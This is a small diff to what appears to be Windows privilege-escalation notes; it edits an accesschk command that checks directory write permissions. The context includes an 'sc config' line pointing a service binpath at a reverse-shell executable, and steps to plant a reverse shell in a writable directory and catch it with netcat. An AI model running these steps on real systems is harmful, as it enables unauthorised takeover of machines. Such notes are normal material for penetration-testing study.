@@ -138,7 +138,7 @@ sc config <svc name> binpath= "\"C:\Privesc\reverse.exe\""
 ```
 3. Check for write permission for each directory path 
 ```
-.\accesschk.exe /accepteula -uwdq <PC username> <dir name> 
+.\accesschk.exe /accepteula -uwdq <dir name> 
 ```
 4. Rename and put reverse shell in editable directory.
 5. setup netcat and run service
